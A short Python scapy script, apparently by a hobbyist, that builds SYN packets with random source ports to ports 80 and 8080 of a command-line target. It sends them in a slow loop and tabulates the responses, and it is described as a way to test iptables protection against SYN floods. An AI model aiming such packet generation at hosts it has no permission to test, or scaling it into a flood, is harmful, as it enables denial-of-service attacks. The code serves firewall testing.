#!/usr/bin/env python3
# Name: Subodh Pachghare
# CyberSpace Name: HaX0R (Cyberninja)
# Website: www.thesubodh.com
# Description: SYN Flood Packet creation for iptables prevention solution

import sys
from scapy.all import *

print("Field Values of packet sent")
# Create SYN Flood packet
p = IP(dst=sys.argv[1], id=1111, ttl=99) / TCP(sport=RandShort(), dport=[80, 8080], seq=12345, ack=1000, window=1000, flags="S") / "HaX0r SVP"

# Display packet fields
p.show()

print("Sending Packets in 0.3 second intervals for timeout of 4 sec")
# Send packets and wait for responses
ans, unans = srloop(p, inter=0.3, retry=2, timeout=4)

print("Summary of answered & unanswered packets")
# Summarize answered and unanswered packets
ans.summary()
unans.summary()

print("Source port flags in response")
# Print response details
ans.make_table(lambda s, r: (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
